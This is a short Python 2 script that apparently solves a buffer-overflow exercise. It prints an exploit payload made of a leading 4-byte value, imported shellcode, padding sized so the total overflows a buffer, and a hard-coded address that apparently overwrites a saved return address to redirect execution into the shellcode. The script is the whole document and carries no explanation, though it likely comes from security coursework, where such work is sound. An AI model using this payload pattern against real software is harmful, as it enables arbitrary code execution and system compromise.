#!/usr/bin/env

from shellcode import shellcode

print "\x05\x00\x00\x40"+shellcode+"x"*(5*4+64+8-len(shellcode))+"\x04\xe0\xff\xb7"

